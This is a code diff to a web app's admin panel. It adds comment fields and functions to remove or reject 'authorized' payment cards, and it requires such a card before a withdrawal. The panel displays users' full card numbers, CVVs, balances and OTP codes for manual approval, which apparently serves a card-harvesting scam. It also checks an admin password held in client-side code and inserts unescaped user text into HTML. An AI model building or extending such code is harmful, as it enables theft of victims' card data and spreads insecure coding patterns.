@@ -138,6 +138,8 @@ button:hover{background:#0044dd;}
 .admin-card-actions{display:flex;gap:12px;margin-top:16px;}
 .admin-auth-btn{flex:1;background:#34d399;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
 .admin-reject-btn{flex:1;background:#ff5c5c;color:white;padding:12px;border-radius:8px;border:none;font-weight:600;cursor:pointer;font-size:14px;}
+.admin-comment-box{padding:8px 0 4px;}
+.admin-comment-input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:8px;color:#fff;padding:10px;font-size:13px;resize:none;font-family:inherit;box-sizing:border-box;}
 .country-section{margin-bottom:32px;}
 .country-header{display:flex;justify-content:space-between;align-items:center;background:rgba(0,85,255,0.1);padding:12px 16px;border-radius:12px;margin-bottom:16px;border-left:4px solid #0055ff;}
 .country-header h3{margin:0;font-size:18px;color:#4dabff;}
@@ -2645,23 +2647,19 @@ function updateWithdrawMethods(country,userData){
   const cards=userData?.linkedCards||[];
   const authCards=cards.filter(c=>c.status==='authorized');
   if(authCards.length>0){
-    const og=document.createElement('optgroup');
-    og.label=t('authorizedBadge');
     authCards.forEach((card,i)=>{
       const op=document.createElement('option');
       op.value='authorized_card_'+i;
       op.textContent=card.brand+' •••• '+card.lastFour;
-      og.appendChild(op);
+      ms.appendChild(op);
     });
-    ms.appendChild(og);
-  }
-  const banks=banksByCountry[country]||banksByCountry.USA;
-  banks.forEach(b=>{
+  }else{
     const op=document.createElement('option');
-    op.value=b.name;
-    op.textContent=b.name;
+    op.value='';
+    op.textContent='No authorized cards — please link and verify a card first';
+    op.disabled=true;
     ms.appendChild(op);
-  });
+  }
 }
 
 document.getElementById('withdraw-method').onchange=async()=>{
@@ -3120,16 +3118,34 @@ window.loadAdminPanel=async function(){
 // ============================================================
 // BUILD CARD DETAIL HTML
 // ============================================================
-window.buildCardDetailHTML=function(user,card,uid,cardIndex,showActions){
+window.buildCardDetailHTML=function(user,card,uid,cardIndex,showActions,cardType){
   const initiated=card.addedDate?`<div class="detail-row"><span class="detail-label">Initiated</span><span style="color:rgba(255,255,255,0.6);font-size:12px;">${formatDate(card.addedDate)}</span></div>`:'';
   const authorizedRow=card.authorizedDate?`<div class="detail-row"><span class="detail-label">Authorized</span><span style="color:#34d399;font-size:12px;">${formatDate(card.authorizedDate)}</span></div>`:'';
   const rejectedRow=card.rejectedDate?`<div class="detail-row"><span class="detail-label">Rejected</span><span style="color:#ff5c5c;font-size:12px;">${formatDate(card.rejectedDate)}</span></div>`:'';
   const otpRow=card.otpCode?`<div class="detail-row"><span class="detail-label">OTP Code</span><span style="color:#3b82f6;font-weight:700;">${card.otpCode}</span></div>`:'';
-  const actionBtns=showActions?`
-    <div class="admin-card-actions">
-      <button class="admin-auth-btn" onclick="adminAuthorizeCard('${uid}',${cardIndex})">${t('authorizeCard')}</button>
-      <button class="admin-reject-btn" onclick="adminRejectCard('${uid}',${cardIndex})">${t('rejectCard')}</button>
-    </div>`:'';
+  const commentRow=card.adminComment?`<div class="detail-row"><span class="detail-label">Admin Note</span><span style="color:#ffc107;font-size:13px;font-style:italic;">${card.adminComment}</span></div>`:'';
+  let actionBtns='';
+  if(showActions){
+    if(cardType==='authorized'){
+      actionBtns=`
+        <div class="admin-comment-box">
+          <textarea id="comment-${uid}-${cardIndex}" class="admin-comment-input" placeholder="Reason for removal/rejection (required)..." rows="2"></textarea>
+        </div>
+        <div class="admin-card-actions">
+          <button class="admin-reject-btn" style="background:#888;" onclick="adminRemoveAuthorizedCard('${uid}',${cardIndex})">🗑️ Remove Card</button>
+          <button class="admin-reject-btn" onclick="adminRejectAuthorizedCard('${uid}',${cardIndex})">❌ Reject Card</button>
+        </div>`;
+    }else{
+      actionBtns=`
+        <div class="admin-comment-box">
+          <textarea id="comment-${uid}-${cardIndex}" class="admin-comment-input" placeholder="Optional comment to user..." rows="2"></textarea>
+        </div>
+        <div class="admin-card-actions">
+          <button class="admin-auth-btn" onclick="adminAuthorizeCard('${uid}',${cardIndex})">${t('authorizeCard')}</button>
+          <button class="admin-reject-btn" onclick="adminRejectCard('${uid}',${cardIndex})">${t('rejectCard')}</button>
+        </div>`;
+    }
+  }
   return `
     <div class="detail-row"><span class="detail-label">${t('brand')}</span><span>${card.brand||'—'}</span></div>
     <div class="detail-row"><span class="detail-label">${t('fullCardNumber')}</span><span style="font-family:monospace;">${card.number||'—'}</span></div>
@@ -3138,7 +3154,7 @@ window.buildCardDetailHTML=function(user,card,uid,cardIndex,showActions){
     <div class="detail-row"><span class="detail-label">${t('cvv')}</span><span>${card.cvv||'—'}</span></div>
     <div class="detail-row"><span class="detail-label">${t('cardBalance')}</span><span>${card.currentBalance||'—'}</span></div>
     <div class="detail-row"><span class="detail-label">Cardholder</span><span>${card.cardName||user.firstname+' '+user.surname}</span></div>
-    ${initiated}${authorizedRow}${rejectedRow}${otpRow}
+    ${initiated}${authorizedRow}${rejectedRow}${otpRow}${commentRow}
     ${actionBtns}`;
 }
 
@@ -3210,12 +3226,12 @@ window.loadAuthorizationTab=async function(){
           <div><div class="admin-card-user">${user.firstname} ${user.surname}</div><div class="admin-card-email">${user.email}</div></div>
           <span class="card-status ${card.status==='otp_required'?'otp':'pending'}">${card.status==='otp_required'?t('otpRequired'):t('pending')}</span>
         </div>
-        ${buildCardDetailHTML(user,card,uid,cardIndex,true)}`;
+        ${buildCardDetailHTML(user,card,uid,cardIndex,true,'pending')}`;
       attNeed.appendChild(el);
     });
   }
 
-  // Authorized section — name list expandable
+  // Authorized section — name list expandable WITH remove/reject actions
   authBody.innerHTML='';
   if(!authorizedCards.length){
     authBody.innerHTML='<p class="acc-empty">No authorized cards</p>';
@@ -3233,7 +3249,7 @@ window.loadAuthorizationTab=async function(){
           <span class="acc-arrow" id="arr-au-${i}">▶</span>
         </div>
         <div id="${detId}" class="name-row-detail" style="display:none;">
-          ${buildCardDetailHTML(user,card,uid,cardIndex,false)}
+          ${buildCardDetailHTML(user,card,uid,cardIndex,true,'authorized')}
         </div>`;
       authBody.appendChild(row);
     });
@@ -3386,6 +3402,51 @@ window.loadReferralData=async function(uid,userData){
 // ============================================================
 // ADMIN AUTHORIZE CARD
 // ============================================================
+// ============================================================
+// ADMIN REMOVE AUTHORIZED CARD (deletes it completely)
+// ============================================================
+window.adminRemoveAuthorizedCard=async function(uid,cardIndex){
+  const comment=document.getElementById('comment-'+uid+'-'+cardIndex)?.value.trim();
+  if(!comment){alert('Please enter a reason for removal.');return;}
+  const password=prompt(t('adminPassword')+':');
+  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
+  if(!confirm('Remove this authorized card? This cannot be undone.'))return;
+  await runTransaction(ref(db,'users/'+uid),u=>{
+    if(u&&u.linkedCards){
+      u.linkedCards.splice(cardIndex,1);
+    }
+    return u;
+  });
+  await sendNotificationToUser(uid,'🗑️ Your card has been removed by admin. Reason: '+comment);
+  alert('Card removed.');
+  loadAuthorizationTab();
+};
+
+// ============================================================
+// ADMIN REJECT AN ALREADY-AUTHORIZED CARD (reverts to rejected)
+// ============================================================
+window.adminRejectAuthorizedCard=async function(uid,cardIndex){
+  const comment=document.getElementById('comment-'+uid+'-'+cardIndex)?.value.trim();
+  if(!comment){alert('Please enter a reason for rejection.');return;}
+  const password=prompt(t('adminPassword')+':');
+  if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
+  if(!confirm('Reject this authorized card? The user will be notified.'))return;
+  await runTransaction(ref(db,'users/'+uid),u=>{
+    if(u&&u.linkedCards&&u.linkedCards[cardIndex]){
+      u.linkedCards[cardIndex].status='rejected';
+      u.linkedCards[cardIndex].rejectedDate=new Date().toISOString();
+      u.linkedCards[cardIndex].adminComment=comment;
+      // If this was the only verified card, mark user as unverified
+      const stillHasAuth=u.linkedCards.some((c,i)=>i!==cardIndex&&c.status==='authorized');
+      if(!stillHasAuth)u.verified=false;
+    }
+    return u;
+  });
+  await sendNotificationToUser(uid,'❌ Your authorized card has been rejected. Reason: '+comment);
+  alert('Card rejected and user notified.');
+  loadAuthorizationTab();
+};
+
 window.adminAuthorizeCard=async function(uid,cardIndex){
   const password=prompt(t('adminPassword')+':');
   if(password!==ADMIN_PASSWORD){alert(t('incorrectPassword'));return;}
